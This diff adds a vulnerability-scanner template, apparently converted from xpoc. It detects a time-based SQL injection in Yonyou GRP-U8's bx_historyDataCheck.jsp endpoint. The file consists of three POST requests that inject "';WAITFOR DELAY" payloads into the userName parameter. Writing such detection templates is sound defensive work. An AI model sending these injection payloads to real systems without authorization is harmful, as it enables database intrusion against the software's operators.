@@ -1,0 +1,38 @@
+id: yaml-poc-yonyou-yonyou_grp_u8-sql_injection-CT-893849
+info:
+  name: Yaml Poc Yonyou Yonyou_Grp_U8 Sql_Injection Ct 893849
+  author: socat
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-yonyou-yonyou_grp_u8-sql_injection-CT-893849'
+  tags: sqli
+  reference: []
+http:
+- method: POST
+  path:
+  - /u8qx/bx_historyDataCheck.jsp
+  body: 'userName='';WAITFOR DELAY ''0:0:0''--&class.module.classLoader.DefaultAssertionStatus=
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: POST
+  path:
+  - /u8qx/bx_historyDataCheck.jsp
+  body: 'userName='';WAITFOR DELAY ''0:0:{{sleepSecond1}}''--&class.module.classLoader.DefaultAssertionStatus=
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+- method: POST
+  path:
+  - /u8qx/bx_historyDataCheck.jsp
+  body: 'userName='';WAITFOR DELAY ''0:0:{{sleepSecond2}}''--&class.module.classLoader.DefaultAssertionStatus=
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
